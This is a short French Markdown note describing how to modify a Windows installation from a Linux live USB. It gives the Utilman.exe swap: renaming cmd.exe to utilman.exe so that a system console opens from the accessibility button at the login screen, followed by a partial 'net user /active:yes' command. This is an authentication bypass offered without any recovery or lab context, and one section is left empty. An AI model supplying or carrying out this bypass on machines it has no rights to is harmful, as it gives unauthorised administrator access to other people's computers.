# Modification de windows à partir d'un live CD Linux

## Installation sur clé USB

## Lancement et modification
Une fois l'ordinateur démarré sous linux, accéder à
`C:\windows\system32\` et renommer `Utilman.exe` en `Utilman.exe.bak` (les fichiers avec extension `.bak` sont généralement des fichiers de sauvegarde). 

Ensuite, rennomer `cmd.exe` en `utilman.exe` pour _camoufler_ la console windows sous l'utilitaire "Utilman", accessible au démarrage de la machine.

`net user /active:yes`
